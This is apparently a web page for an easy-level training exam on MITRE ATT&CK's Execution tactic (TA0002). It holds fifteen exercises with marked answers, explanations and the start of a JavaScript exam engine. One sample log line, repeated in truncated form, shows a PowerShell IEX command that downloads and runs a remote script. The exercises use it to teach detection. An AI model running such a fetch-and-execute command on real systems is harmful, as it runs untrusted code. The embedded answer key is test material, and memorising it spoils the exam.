<script type="application/json" id="exam-data">{"config":{"objectId":"TA0002","introTitle":"MITRE ATT&CK TA0002 — Execution","severity":"EASY","difficulty":"easy","batch":1,"title":"TA0002 Execution — EASY","minutes":25,"seconds":1500},"intro":{"entityHtml":"\u003ch2>What you will learn\u003c/h2>\u003cp>Welcome! This exam is about one part of the MITRE ATT&CK framework: the tactic called \u003cb>Execution\u003c/b>, with the ID \u003cb>TA0002\u003c/b>. You will learn what it is, why it matters, and how real security teams work with it every day.\u003c/p>\u003ch3>What is MITRE ATT&CK?\u003c/h3>\u003cp>MITRE ATT&CK is a big, public knowledge base. It describes what real attackers do, step by step. ATT&CK splits an attack into goals called \u003cb>tactics\u003c/b>. Every tactic has an ID that starts with \u003cb>TA\u003c/b>. Every way to reach a goal is called a \u003cb>technique\u003c/b>. Technique IDs start with \u003cb>T\u003c/b>.\u003c/p>\u003ch3>What is Execution (TA0002)?\u003c/h3>\u003cp>This object is a \u003cb>Tactic\u003c/b> — a goal, not a single action. The goal of TA0002 is simple: \u003cb>run attacker code on a target system\u003c/b>. Imagine an attacker sends an email with a bad attachment. An employee opens it. The attachment runs a script. At that moment the attacker has reached Execution: their code now runs inside the company. Before this step, the attacker often only has a document, a link, or a network position. After this step, their commands run on a real machine.\u003c/p>\u003cp>Execution usually comes right after \u003cb>Initial Access (TA0001)\u003c/b> and before \u003cb>Persistence (TA0003)\u003c/b>. Almost every serious attack needs this step. If defenders stop Execution, the attack usually stops too.\u003c/p>\u003ch3>Techniques that live under TA0002\u003c/h3>\u003cp>ATT&CK lists many ways to reach this goal. The best-known ones are: \u003cb>Command and Scripting Interpreter (T1059)\u003c/b> — for example PowerShell, Windows Command Shell, Unix Shell, AppleScript or Python; \u003cb>Windows Management Instrumentation (T1047)\u003c/b>; \u003cb>Scheduled Task/Job (T1053)\u003c/b>; \u003cb>User Execution (T1204)\u003c/b> — when a person opens a bad link or file; \u003cb>Exploitation for Client Execution (T1203)\u003c/b>; \u003cb>System Services (T1569)\u003c/b>; \u003cb>Inter-Process Communication (T1559)\u003c/b>; \u003cb>Hijack Execution Flow (T1574)\u003c/b>; \u003cb>Trusted Developer Utilities Proxy Execution (T1127)\u003c/b>; \u003cb>Native API (T1106)\u003c/b>; \u003cb>Software Deployment Tools (T1072)\u003c/b>; \u003cb>Shared Modules (T1129)\u003c/b>; \u003cb>Deploy Container (T1610)\u003c/b>; and \u003cb>Serverless Execution (T1648)\u003c/b>. Some techniques also serve other tactics — a scheduled task, for example, can execute code now (Execution) or start it again after a reboot (Persistence).\u003c/p>\u003ch3>Where is it used in real work?\u003c/h3>\u003cul>\u003cli>\u003cb>SOC analysts\u003c/b> see Execution alerts every day, for example: an Office program started PowerShell. They decide if it is an attack.\u003c/li>\u003cli>\u003cb>Threat hunters\u003c/b> search logs for attacker scripts: PowerShell script block logging (event 4104), process creation (4688), task creation (4698), service installs (7045).\u003c/li>\u003cli>\u003cb>Incident responders\u003c/b> stop running code, collect evidence, and clean systems.\u003c/li>\u003cli>\u003cb>Detection engineers\u003c/b> write rules for these events, for example: alert when a browser or Office app spawns a script interpreter.\u003c/li>\u003cli>\u003cb>Red teamers\u003c/b> use the same techniques (with written permission) to test defences.\u003c/li>\u003cli>\u003cb>GRC analysts and control owners\u003c/b> use TA0002 to justify controls like application allowlisting, exploit protection and user training.\u003c/li>\u003cli>\u003cb>Threat intelligence analysts\u003c/b> map adversary reports to TA0002 when they brief the CISO.\u003c/li>\u003c/ul>\u003ch3>What risks does it address?\u003c/h3>\u003cp>If you do not understand Execution, you miss the moment an attacker takes control of a machine. Files and network traffic can look normal, but one running script can steal data or start ransomware. That is why this tactic is one of the most important to master.\u003c/p>","rulesHtml":"\u003ch3>Difficulty of this file: EASY\u003c/h3>\u003cp>Foundational and guided. Each exercise tests one idea only. Short scenarios, clear wording, and hints that point at the concept itself. There are no trick answers here — you build solid ground first.\u003c/p>\u003ch3>Exercise types you will meet\u003c/h3>\u003cp>Multiple-choice questions, multi-select questions with partial credit, matching, drag-and-drop placement of techniques, ordering, fill-in-the-blank with a word bank, priority ranking, short branching scenarios, a log viewer with a filter box, and one small command-line lab.\u003c/p>\u003ch3>Scoring (please read — it helps you)\u003c/h3>\u003cul>\u003cli>Each exercise gives at most 1 point of credit. You pass with \u003cb>70%\u003c/b> over the exercises you answer.\u003c/li>\u003cli>Multi-item exercises (several correct options, several slots, several steps) give \u003cb>partial credit\u003c/b>: every correct item counts, but every wrong item subtracts. Selecting everything is worth 0, so only pick what you are sure of.\u003c/li>\u003cli>A partially correct answer still earns credit — for example 3 of 5 correct items give credit 0.60.\u003c/li>\u003c/ul>\u003ch3>Check buys you unlimited thinking time\u003c/h3>\u003cp>When you press \u003cb>Check\u003c/b>, the timer stops by itself. The feedback stays visible and you can study it as long as you want. The timer only runs again when you press \u003cb>Next\u003c/b> (or Final Submit on the last exercise). This is shown as “PAUSED — reviewing feedback”.\u003c/p>\u003ch3>Manual pause\u003c/h3>\u003cp>The \u003cb>Pause\u003c/b> button stops the timer for a real break. While it is paused, the exercise is hidden so nobody can read it. Press \u003cb>Resume\u003c/b> to continue.\u003c/p>\u003ch3>Skipping\u003c/h3>\u003cul>\u003cli>Every exercise has a \u003cb>Skip\u003c/b> button. Skipping hides the answer and moves the exercise to a review pool. The timer keeps running.\u003c/li>\u003cli>Before the exam ends you get a \u003cb>review screen\u003c/b> where you can answer skipped exercises as often as you like while time remains.\u003c/li>\u003cli>Skipped exercises that stay unanswered are \u003cb>excluded\u003c/b> from the score — they count neither for nor against you.\u003c/li>\u003c/ul>\u003ch3>Hints\u003c/h3>\u003cp>One hint per exercise. A hint costs \u003cb>−10% of that exercise’s credit\u003c/b> (never more). It gives a nudge, not the answer.\u003c/p>\u003ch3>Retake\u003c/h3>\u003cp>After the results screen you can retake the exam. Questions and answer choices are shuffled again.\u003c/p>"},"keywords":[{"theme":"Tactic objective & lifecycle position","chips":["Run attacker code on target","TA0002 = Execution","Follows Initial Access (TA0001)","Precedes Persistence (TA0003)","Adversary goal, not one action"]},{"theme":"Execution techniques & sub-techniques","chips":["T1059 Command and Scripting Interpreter","T1059.001 PowerShell","T1059.003 Windows Command Shell","T1059.004 Unix Shell","T1059.002 AppleScript","T1047 WMI","T1053 Scheduled Task/Job","T1053.005 Scheduled Task","T1204.001 Malicious Link","T1204.002 Malicious File","T1203 Exploitation for Client Execution","T1569.002 Service Execution","T1106 Native API","T1127.001 MSBuild","T1559 Inter-Process Communication","T1574 Hijack Execution Flow","T1072 Software Deployment Tools","T1129 Shared Modules","T1610 Deploy Container","T1648 Serverless Execution"]},{"theme":"Platforms & permissions","chips":["Windows","macOS","Linux","Containers","IaaS / Cloud","User vs administrator rights"]},{"theme":"Data sources & telemetry","chips":["Process creation (4688)","Script block logging (4104)","Module logging (4103)","Task creation (4698)","Service install (7045)","Sysmon process events","WMI activity logs","EDR telemetry"]},{"theme":"Detection logic & analytics","chips":["Office app spawning interpreter","Encoded command hunting","Parent-child process anomalies","Service created off-hours","Task registered at logon"]},{"theme":"Mitigations & controls","chips":["M1038 Execution Prevention","M1040 Behavior Prevention on Endpoint","M1017 User Training","M1049 Antivirus / Antimalware","M1050 Exploit Protection","M1026 Privileged Account Management","M1021 Restrict Web-Based Content"]},{"theme":"Adversary use & tooling","chips":["APT29","Lazarus","FIN7","Wizard Spider","OilRig","APT41","Cobalt Strike","PowerShell Empire","Metasploit"]}],"exercises":[{"id":"E01","type":"qcm","summary":"Trainee onboarding — what is the goal of the Execution tactic?","scenario":["You are a new SOC trainee at CyberPulse. Your coach opens the MITRE ATT&CK matrix and points at the second column. She says: “Every ATT&CK tactic is one goal an attacker wants to reach. This one is TA0002, Execution.”"],"artefacts":[{"label":"ARTEFACT — Coach’s whiteboard note","kind":"text","body":["Tactic = the attacker’s goal. Technique = one way to reach that goal. TA0002 = Execution."]}],"question":"Which sentence best describes the main goal of the Execution tactic (TA0002)?","hint":"Execution is about making code run. Think about the exact moment attacker code starts on a machine.","explanation":"\u003cb>Running attacker code on the target system is correct.\u003c/b> Execution (TA0002) is the goal of running attacker code on a system. \u003cb>Copying stolen data to an outside server is Exfiltration (TA0010)\u003c/b> — sending data out. \u003cb>Collecting passwords from many computers is Credential Access (TA0006)\u003c/b> — stealing passwords. \u003cb>Keeping access after every reboot is Persistence (TA0003)\u003c/b> — keeping access over reboots. Remember: tactics are goals, and this goal is “make my code run”.","study":"The intro section of this exam, especially “What is Execution (TA0002)?”","data":{"options":[{"t":"To collect passwords from many computers.","why":"That is Credential Access (TA0006), not Execution."},{"t":"To run attacker code on the target system.","correct":true,"why":"Correct — Execution means the attacker’s code starts running on the machine."},{"t":"To copy stolen data to an outside server.","why":"That is Exfiltration (TA0010), a later goal in the attack."},{"t":"To keep access after every system reboot.","why":"That is Persistence (TA0003), the next goal after code runs."}]}},{"id":"E02","type":"categorize","summary":"Whiteboard drill — place each technique in or out of the Execution column","scenario":["Your coach draws two boxes on the whiteboard. She sticks six technique cards on the side and asks you to sort them."],"artefacts":[{"label":"ARTEFACT — ATT&CK excerpt (read it first)","kind":"text","body":["Execution (TA0002) holds techniques whose goal is to make attacker code run: interpreters like T1059, WMI (T1047), User Execution (T1204), and more.","Techniques from other tactics do other jobs: a phishing email gets the attacker in (Initial Access), a Run key brings code back after reboot (Persistence), and dumping memory steals passwords (Credential Access)."]}],"question":"Sort every card into the right box: inside Execution (TA0002) or inside Another tactic.","hint":"Execution techniques make code run. Phishing emails, startup keys and password dumping have other goals.","explanation":"T1059 (interpreter), T1047 (WMI) and T1204.002 (malicious file opened by a user) all make code run — they belong to Execution. T1566.001 is the phishing email that gives initial entry, T1547.001 keeps code starting at logon (Persistence), and T1003.001 steals passwords from memory (Credential Access). Each wrong card was wrong for one clear reason, and now you know it.","study":"The technique list under TA0002 in the intro, plus one example per neighbour tactic.","data":{"zones":[{"title":"Execution (TA0002)"},{"title":"Another tactic"}],"items":[{"t":"T1059 — Command and Scripting Interpreter","target":0,"why":"Interpreters run attacker commands and scripts — core Execution."},{"t":"T1047 — Windows Management Instrumentation","target":0,"why":"WMI can start processes and payloads — Execution."},{"t":"T1204.002 — Malicious File (User Execution)","target":0,"why":"The user opens the file, the attacker’s code runs — Execution."},{"t":"T1566.001 — Spearphishing Attachment","target":1,"why":"The email delivers entry — Initial Access (TA0001), not Execution."},{"t":"T1547.001 — Registry Run Keys / Startup Folder","target":1,"why":"This keeps code coming back at logon — Persistence (TA0003)."},{"t":"T1003.001 — LSASS Memory","target":1,"why":"Dumping LSASS steals passwords — Credential Access (TA0006)."}]}},{"id":"E03","type":"match","summary":"Flash-card round — match four Execution technique IDs to their names","scenario":["Your coach runs a quick flash-card round. She wants you to connect four IDs to their technique names. All four live in the Execution column."],"artefacts":[],"question":"Match each ATT&CK ID on the left to the correct technique name.","hint":"Say each name slowly: PowerShell-style interpreter, WMI, the user runs the file, a scheduled task.","explanation":"T1059 is Command and Scripting Interpreter (PowerShell lives under it as T1059.001). T1047 is Windows Management Instrumentation, Microsoft’s built-in management framework that can start processes. T1204 is User Execution — the human performs the action that runs the payload. T1053 is Scheduled Task/Job — code run by the task scheduler.","study":"The “Techniques that live under TA0002” list in the intro.","data":{"zones":[{"title":"T1059"},{"title":"T1047"},{"title":"T1204"},{"title":"T1053"}],"items":[{"t":"Command and Scripting Interpreter","target":0,"why":"T1059 groups shells and script languages used to run commands."},{"t":"Windows Management Instrumentation","target":1,"why":"T1047 abuses WMI to start processes and payloads."},{"t":"User Execution","target":2,"why":"T1204 relies on the user opening a link or file."},{"t":"Scheduled Task/Job","target":3,"why":"T1053 uses task scheduling to run code now or later."}]}},{"id":"E04","type":"qcm","summary":"Training video — why the macro step mattered to the attacker","scenario":["You watch a safe training video about a real attack. The video shows: an employee receives an email with an Excel attachment. The employee opens it and clicks Enable Content. A macro starts and runs a PowerShell command. The attacker’s code is now running on the laptop."],"artefacts":[],"question":"From the attacker’s point of view, why was the macro step important?","hint":"Ask what the attacker gained in that exact moment. One thing happened: their code started to run.","explanation":"\u003cb>Making the attacker’s code run on the laptop is correct.\u003c/b> The macro click made the attacker’s code run — that is the whole point of TA0002. \u003cb>Erasing the security logs\u003c/b> describes log clearing, which attackers do later to hide (Defense Evasion). \u003cb>Mapping every shared folder\u003c/b> describes Discovery — learning about the network. \u003cb>Re-arming the code after each reboot\u003c/b> describes Persistence — surviving reboots. Those may come next, but the macro moment itself is Execution.","study":"The attacker-perspective paragraph in the intro: what Execution gives the adversary.","data":{"options":[{"t":"It made the attacker’s code run on the laptop.","correct":true,"why":"Correct — one click turned a document into running code: Execution."},{"t":"It mapped every shared folder of the network.","why":"That is Discovery — looking around, not running the payload."},{"t":"It erased the security logs of the laptop.","why":"Log clearing is hiding behaviour, a different goal (Defense Evasion)."},{"t":"It re-armed the code after each reboot.","why":"That is Persistence — surviving reboots comes after execution."}]}},{"id":"E05","type":"order","summary":"Lifecycle drill — order five tactics the way a typical attack flows","scenario":["Your coach compares ATT&CK to the steps of a burglary: get in, act, stay, climb higher, take valuables away. She gives you five tactic cards to order."],"artefacts":[],"question":"Drag the five tactics into the order a typical attack uses them.","hint":"The attacker must first get in, then run code, then stay, then gain power, and finally take data out.","explanation":"A typical flow: Initial Access gets the attacker inside; Execution runs their code; Persistence keeps it coming back; Privilege Escalation gains more power (like admin); Exfiltration sends stolen data out. ATT&CK orders tactics roughly this way in its matrix, which is why Execution sits early — attackers cannot do much before their code runs.","study":"The lifecycle position paragraph in the intro.","data":{"items":[{"t":"Initial Access (TA0001)","why":"First the attacker gets a foothold, for example by phishing."},{"t":"Execution (TA0002)","why":"Then the attacker runs their code on the foothold machine."},{"t":"Persistence (TA0003)","why":"Then they make sure the code survives reboots."},{"t":"Privilege Escalation (TA0004)","why":"Then they gain higher rights, like administrator."},{"t":"Exfiltration (TA0010)","why":"Finally they send stolen data outside."}]}},{"id":"E06","type":"fill","summary":"Notebook summary — complete the coach’s dictation about TA0002","scenario":["Your coach dictates a short summary sentence for your notebook. Fill every gap with one word or phrase from the box."],"artefacts":[],"question":"Choose the correct word for each gap.","hint":"Gap 1 is the tactic name. Gap 2 is what the attacker runs. Gap 3 is the tactic that comes just before.","explanation":"TA0002 is called Execution. Its goal is running attacker code on the target. In the ATT&CK order it follows Initial Access (TA0001). The other bank words belong to later tactics: Persistence keeps code alive, Exfiltration sends data out, and passwords are the goal of Credential Access.","study":"The first two paragraphs of the intro explanation.","data":{"textWithBlanks":"TA0002 is the tactic called {1}. It is about running attacker {2} on a target system. In a typical attack it comes right after {3}.","blanks":[{"answer":"Execution","why":"TA0002 is the Execution tactic."},{"answer":"code","why":"Execution means attacker code runs on the machine."},{"answer":"Initial Access","why":"The attacker must get in (TA0001) before running code (TA0002)."}],"bank":["Persistence","Exfiltration","passwords","commands","firewalls"]}},{"id":"E07","type":"terminal","summary":"Lab demo — start the scheduled task CleanTemp with schtasks","scenario":["You are in the training lab. Your coach says: “On our lab PC, a scheduled task named CleanTemp exists. It is our safe demo of technique T1053.005 (Scheduled Task, part of TA0002). Start the task now with the schtasks command so the class can watch it run.”"],"artefacts":[{"label":"ARTEFACT — Expected output shape","kind":"code","lines":["SUCCESS: The scheduled task \"CleanTemp\" is currently running."]}],"question":"Type the command that starts the scheduled task named CleanTemp, then press Run.","hint":"The syntax panel shows the exact shape. You need /run and /tn, then the task name.","explanation":"The canonical command is \u003cb>schtasks /run /tn CleanTemp\u003c/b>. \u003cb>schtasks\u003c/b> is the Windows tool for scheduled tasks. \u003cb>/run\u003c/b> starts an existing task right now. \u003cb>/tn\u003c/b> says that the task name follows. This is how technique T1053.005 execution looks on the command line — the same command an attacker would run, which is why defenders watch for it in process logs (event 4688). Nothing was changed on the system except starting a task that already existed.","study":"Technique T1053.005 (Scheduled Task) and its place under TA0002.","data":{"prompt":"C:\\Users\\trainee>","banner":["Microsoft Windows [training lab]","The scheduled task CleanTemp already exists on this PC."],"simMatch":"^schtasks\\b","sim":["INFO: The scheduled task \"CleanTemp\" is currently running."],"syntax":{"note":"\u003ccode>schtasks /run /tn &lt;TaskName&gt;\u003c/code> — \u003cb>/run\u003c/b> starts the task now; \u003cb>/tn\u003c/b> means “task name” and the name follows it.","example":"schtasks /run /tn NightlyScan","sampleOut":"SUCCESS: The scheduled task \"NightlyScan\" is currently running."},"elements":[{"re":"^schtasks\\b","label":"Tool: schtasks","why":"schtasks is the built-in Windows task scheduler command."},{"re":"\\/run\\b","label":"Flag: /run (start the task now)","why":"/run triggers an existing task immediately."},{"re":"\\/tn\\b","label":"Flag: /tn (task name follows)","why":"/tn tells schtasks which task you mean."},{"re":"cleantemp","label":"Target: the task named CleanTemp","why":"The demo task is named CleanTemp."}],"danger":[],"canonical":"schtasks /run /tn CleanTemp"}},{"id":"E08","type":"qcm","summary":"Log reading — which line shows attacker script text running?","scenario":["Your coach shows you four log lines from one lab host. Three are boring. One is exactly what TA0002 looks like in the logs."],"artefacts":[{"label":"ARTEFACT — Lab host logs (you may filter them)","kind":"log","filter":true,"lines":["2026-09-14 09:12:01  PowerShell/Operational  Event 4104  ScriptBlock  \"Get-Date\"","2026-09-14 09:12:41  PowerShell/Operational  Event 4104  ScriptBlock  \"IEX (New-Object Net.WebClient).DownloadString('hxxp://10[.]20[.]4[.]31/a[.]ps1')\"","2026-09-14 09:13:02  Security  Event 4688  A new process has been created: svchost.exe (PID 812)","2026-09-14 09:13:55  Security  Event 4688  A new process has been created: explorer.exe (PID 2044)"]}],"question":"Which line shows attacker script text being executed?","hint":"Look for a 4104 script block that downloads and runs something from a strange address.","explanation":"\u003cb>The second line is correct.\u003c/b> Event 4104 records the script text PowerShell ran. Here the text downloads and executes a script from an outside address — a classic Execution (T1059.001) sight. \u003cb>Line 1\u003c/b> is also a 4104, but Get-Date is a harmless admin command. \u003cb>Lines 3 and 4\u003c/b> are process creation events (4688) for normal Windows programs: svchost and explorer are standard system processes.","study":"The “Data sources & telemetry” theme: script block logging (4104) vs process creation (4688).","data":{"options":[{"t":"09:12:41 — Event 4104 ScriptBlock download + IEX run","correct":true,"why":"Correct — the script text downloads and runs a payload from an outside address."},{"t":"09:13:02 — Event 4688 new process svchost.exe","why":"svchost is a standard Windows service host."},{"t":"09:12:01 — Event 4104 ScriptBlock \"Get-Date\"","why":"Get-Date is a normal, harmless admin command."},{"t":"09:13:55 — Event 4688 new process explorer.exe","why":"explorer is the normal Windows desktop process."}]}},{"id":"E09","type":"qcm","summary":"Odd one out — which of these is an Execution technique?","scenario":["A colleague sends you four IDs in a chat and asks: “One of these is an Execution (TA0002) technique. Which one?”"],"artefacts":[],"question":"Which of these is an Execution (TA0002) technique?","hint":"One of them is literally a way to run commands on a computer.","explanation":"\u003cb>PowerShell (T1059.001) is correct.\u003c/b> It is the best-known sub-technique of Command and Scripting Interpreter, a core Execution technique. \u003cb>Web Protocols (T1071.001)\u003c/b> is how malware talks out (Command and Control). \u003cb>Exfiltration Over C2 Channel (T1041)\u003c/b> is sending stolen data out. \u003cb>Account Manipulation (T1098)\u003c/b> is a Persistence move.","study":"The technique list in the intro, and the tactics each wrong option belongs to.","data":{"options":[{"t":"T1071.001 — Web Protocols","why":"That is Command and Control — talking to attacker servers."},{"t":"T1041 — Exfiltration Over C2 Channel","why":"That is Exfiltration — stealing data out."},{"t":"T1059.001 — PowerShell","correct":true,"why":"Correct — a script interpreter used to run attacker commands: Execution."},{"t":"T1098 — Account Manipulation","why":"That is Persistence — keeping access through accounts."}]}},{"id":"E10","type":"categorize","summary":"Evidence sorting — attach each log line to the technique it proves","scenario":["The SOC shows you four short log lines from one Windows host. Each line is evidence for one of two Execution techniques. Sort them."],"artefacts":[{"label":"ARTEFACT — Reminder about the two techniques","kind":"text","body":["T1059.001 PowerShell: its script text lands in PowerShell/Operational events 4104 (script block) and 4103 (module).","T1053.005 Scheduled Task: task lifecycle shows up in Security events 4698 (created), 4699 (deleted), 4702 (updated)."]}],"question":"Drag each log line to the technique it is evidence for.","hint":"First look at the event ID: 4104 and 4103 are PowerShell; 4698 and 4699 are scheduled tasks.","explanation":"4104 records the script text PowerShell executed, and 4103 records module pipeline runs — both prove T1059.001. Event 4698 is written when a scheduled task is created and 4699 when it is deleted — both prove T1053.005. Knowing which event ID belongs to which technique makes triage fast: the ID tells you the family before you even read the text.","study":"Event ID families: PowerShell 4103/4104 vs task events 4698/4699/4702.","data":{"zones":[{"title":"T1059.001 PowerShell"},{"title":"T1053.005 Scheduled Task"}],"items":[{"t":"Event 4104 — script text: IEX(New-Object Net.WebClient).DownloadString(...)","target":0,"why":"4104 records executed PowerShell script text — T1059.001."},{"t":"Event 4103 — module logging: pipeline start for Get-Process","target":0,"why":"4103 is PowerShell module logging — T1059.001."},{"t":"Event 4698 — task created: name SyshealthUpdate, action rundll32.exe","target":1,"why":"4698 is written when a scheduled task is created — T1053.005."},{"t":"Event 4699 — task deleted: name SyshealthUpdate","target":1,"why":"4699 is written when a scheduled task is deleted — T1053.005."}]}},{"id":"E11","type":"qcm","summary":"First alert — the best first step on an Office-spawns-PowerShell alert","scenario":["You are on your first SOC shift. An alert pops up: “WINWORD.EXE started powershell.exe on HOST-77.” Your playbook says: first decide whether this really is Execution behaviour (TA0002), then act."],"artefacts":[],"question":"What is the best first step?","hint":"Good triage starts with reading the details the alert already gives you.","explanation":"\u003cb>Reading the full PowerShell command line is correct.\u003c/b> It tells you what the script actually did — that is how you confirm or drop the suspicion of Execution. \u003cb>Shutting down the whole network\u003c/b> is far too aggressive for one alert. \u003cb>Removing Word from every laptop\u003c/b> is disproportionate and would break the business. \u003cb>Closing the alert\u003c/b> ignores the anomaly: Word normally never starts PowerShell, so the parent-child pair itself deserves a look.","study":"The “Detection logic & analytics” theme: parent-child anomalies (Office spawning interpreters).","data":{"options":[{"t":"Shut down the whole office network straight away.","why":"Far too aggressive for a single unconfirmed alert."},{"t":"Remove Word from every laptop in the company.","why":"Disproportionate and harmful — Word is needed for work."},{"t":"Open the alert and read the full PowerShell command line.","correct":true,"why":"Correct — the command line shows what ran and whether it is attacker code."},{"t":"Close the alert because Word is normal software.","why":"Word starting PowerShell is not normal — ignoring it risks a real attack."}]}},{"id":"E12","type":"fill","summary":"Telemetry note — fill the event IDs for the detection team","scenario":["You write a short note for the detection team so they collect the right telemetry for Execution techniques. Complete every gap with an event ID from the box."],"artefacts":[],"question":"Choose the correct event ID for each gap.","hint":"Script text is 4104. New processes are 4688. New scheduled tasks are 4698. The others do not fit.","explanation":"Event 4104 is PowerShell script block logging — it captures the script text itself. Event 4688 is process creation — it shows which program started which other program. Event 4698 is written when a scheduled task is created. The other IDs are real but belong elsewhere: 7045 is service installation, 1102 is audit-log clearing, and 4624 is a successful logon.","study":"The “Data sources & telemetry” theme chips in the intro.","data":{"textWithBlanks":"To see attacker scripts on Windows, we collect PowerShell script block logging, event ID {1}. We also collect process creation, event ID {2}, to see which program started which other program. A newly created scheduled task writes event ID {3}.","blanks":[{"answer":"4104","why":"4104 = script block logging: the executed script text."},{"answer":"4688","why":"4688 = process creation with the command line."},{"answer":"4698","why":"4698 = a scheduled task was created."}],"bank":["7045","1102","4624"]}},{"id":"E13","type":"categorize","summary":"Red vs blue — whose statement is it?","scenario":["During a class exercise, four short statements float past on sticky notes. Some are attacker goals, some are defender actions. Sort them."],"artefacts":[],"question":"Drag each statement to the right side: attacker goal (red) or defender action (blue).","hint":"Attackers want their code to run. Defenders watch logs and write alerts.","explanation":"“Make my payload run” and “use a macro so one click runs my code” are attacker goals — both aim at TA0002. “Alert when Office starts PowerShell” and “collect script block logs” are defender actions — they detect TA0002. Understanding both sides helps you predict what attackers try and what evidence they leave behind.","study":"The dual view: attacker goals vs defender actions on the same technique.","data":{"zones":[{"title":"Attacker goal (red)"},{"title":"Defender action (blue)"}],"items":[{"t":"Make my payload run on the victim laptop.","target":0,"why":"This is literally the Execution goal."},{"t":"Alert when an Office app starts PowerShell.","target":1,"why":"A detection rule is a defender action."},{"t":"Collect script block logs from all endpoints.","target":1,"why":"Telemetry collection is a defender action."},{"t":"Use a macro so my code runs with one click.","target":0,"why":"Abusing User Execution (T1204.002) is an attacker goal."}]}},{"id":"E14","type":"match","summary":"GRC corner — match each mitigation ID to what it really does","scenario":["Your GRC colleague lists three MITRE mitigations that weaken Execution techniques. She asks you to match each ID to its plain-language meaning before tomorrow’s control review."],"artefacts":[],"question":"Match each mitigation ID to what it really does.","hint":"One allows only approved programs, one trains people, one scans and stops bad code.","explanation":"M1038 Execution Prevention is application control: only approved programs may run, which directly blocks script interpreters and rogue binaries. M1017 User Training teaches staff to spot lures, which blunts T1204 User Execution. M1049 Antivirus/Antimalware scans and stops known bad code when it runs. Each control attacks a different part of the Execution problem: what may run, what people open, and what gets caught.","study":"The “Mitigations & controls” theme chips in the intro.","data":{"zones":[{"title":"M1038"},{"title":"M1017"},{"title":"M1049"}],"items":[{"t":"Execution Prevention — allow only approved programs to run","target":0,"why":"M1038 is application control / allowlisting."},{"t":"User Training — teach staff to spot lures","target":1,"why":"M1017 is awareness training, aimed at user-driven execution."},{"t":"Antivirus / Antimalware — scan and stop bad code","target":2,"why":"M1049 is the classic AV/EDR signature and behaviour layer."}]}},{"id":"E15","type":"match","summary":"Shift wrap-up — match each data source to its example event","scenario":["End of shift drill: your lead reads out four telemetry sources. You must name the Windows event that carries each one."],"artefacts":[],"question":"Match each data source to its example event ID.","hint":"Each pair is one event ID. Script text, new process, new task, new service.","explanation":"Process creation is event 4688. Script block logging (the script text PowerShell ran) is 4104. Scheduled task creation is 4698. Service installation is 7045. These four events together catch a large share of TA0002 behaviour on Windows: a process starts, a script runs, a task is registered, or a service is installed.","study":"The “Data sources & telemetry” theme chips in the intro.","data":{"zones":[{"title":"Process creation"},{"title":"Script block logging"},{"title":"Task creation"},{"title":"Service install"}],"items":[{"t":"Event ID 4688","target":0,"why":"4688 logs every new process, with its command line."},{"t":"Event ID 4104","target":1,"why":"4104 logs the PowerShell script text that ran."},{"t":"Event ID 4698","target":2,"why":"4698 logs the creation of a scheduled task."},{"t":"Event ID 7045","target":3,"why":"7045 logs the installation of a new service."}]}}]}</script>
<script>
/* Cyber Pulse Academy exam engine — part A (core) */
(function () {
'use strict';

var META = JSON.parse(document.getElementById('cm-exercise-meta').textContent);
var DATA = JSON.parse(document.getElementById('exam-data').textContent);
var CFG = DATA.config;

/* ---------------- helpers ---------------- */
function $(s, r) { return (r || document).querySelector(s); }
function el(tag, cls, html) { var e = document.createElement(tag); if (cls) { e.className = cls; } if (html != null) { e.innerHTML = html; } return e; }
function esc(s) { return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
function shuffle(a) { var x = a.slice(); for (var i = x.length - 1; i > 0; i--) { var j = Math.floor(Math.random() * (i + 1)); var t = x[i]; x[i] = x[j]; x[j] = t; } return x; }
function pad(n) { return (n < 10 ? '0' : '') + n; }
function fmtClock(sec) { sec = Math.max(0, Math.floor(sec)); var h = Math.floor(sec / 3600), m = Math.floor((sec % 3600) / 60), s = sec % 60; return (h ? h + ':' + pad(m) : String(m)) + ':' + pad(s); }
function round1(n) { return Math.round(n * 10) / 10; }
function byId(id) { for (var i = 0; i < DATA.exercises.length; i++) { if (DATA.exercises[i].id === id) { return DATA.exercises[i]; } } return null; }
function badgeClass(sev) { return 'badge badge-' + (CFG.difficulty === 'extremely-hard' ? 'xhard' : CFG.difficulty); }

/* lightweight log/code highlighter (timestamps + Windows event IDs) */
function hl(text) {
  var t = esc(text);
  t = t.replace(/(\d{4}-\d{2}-\d{2}|\d{2}:\d{2}:\d{2})/g, '<span class="tk-time">$1</span>');
  t = t.replace(/\b(4688|4104|4698|7045|4103|4697|4699|4702|1102|4624)\b/g, '<span class="tk-eid">$1</span>');
  return t;
}
function artefactNode(a) {
  var wrap = el('div', 'artefact');
  wrap.appendChild(el('div', 'artefact-h', esc(a.label)));
  var body = el('div', 'artefact-b');
  if (a.kind === 'log' || a.kind === 'code') {
    if (a.kind === 'log' && a.filter) {
      var fl = el('div', 'logfilter');
      var inp = document.createElement('input');
      inp.type = 'text'; inp.placeholder = 'Filter lines…'; inp.setAttribute('aria-label', 'Filter log lines');
      var pre = el('pre', 'log');
      var render = function () {
        var q = inp.value.toLowerCase();
        var lines = a.lines.filter(function (ln) { return !q || String(ln).toLowerCase().indexOf(q) >= 0; });
        pre.innerHTML = lines.length ? lines.map(hl).join('\n') : '<span style="color:#7a87a0">No lines match this filter.</span>';
      };
      inp.addEventListener('input', render);
      fl.appendChild(inp);
      body.appendChild(fl);
      body.appendChild(pre);
      render();
    } else {
      var p = el('pre', a.kind === 'log' ? 'log' : 'code');
      p.innerHTML = (a.lines || []).map(hl).join('\n');
      body.appendChild(p);
    }
  } else if (a.kind === 'table') {
    var tb = el('div');
    tb.style.overflowX = 'auto';
    var tbl = el('table');
    tbl.style.borderCollapse = 'collapse'; tbl.style.width = '100%'; tbl.style.fontSize = '14px';
    (a.rows || []).forEach(function (row, ri) {
      var tr = document.createElement('tr');
      row.forEach(function (cellText) {
        var td = el(ri === 0 ? 'th' : 'td');
        td.style.cssText = 'border:1px solid #2a3550;padding:7px 10px;text-align:left;font-weight:' + (ri === 0 ? '800' : '400') + ';background:' + (ri % 2 ? '#121a2c' : 'transparent');
        td.innerHTML = hl(cellText);
        tr.appendChild(td);
      });
      tbl.appendChild(tr);
    });
    tb.appendChild(tbl);
    body.appendChild(tb);
  } else {
    (a.body instanceof Array ? a.body : [a.body || '']).forEach(function (para) { body.appendChild(el('p', null, para)); });
  }
  wrap.appendChild(body);
  return wrap;
}

/* ---------------- partial-credit scoring engine ---------------- */
